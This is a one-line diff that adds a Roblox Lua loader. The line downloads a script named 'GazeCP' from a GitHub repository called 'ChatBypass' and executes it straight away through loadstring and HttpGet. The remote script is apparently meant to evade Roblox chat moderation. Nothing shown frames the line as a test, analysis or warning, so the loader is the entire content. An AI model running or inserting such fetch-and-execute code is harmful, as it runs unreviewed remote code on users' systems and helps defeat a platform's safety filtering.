@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Valysee/ChatBypass/refs/heads/main/GazeCP"))() 
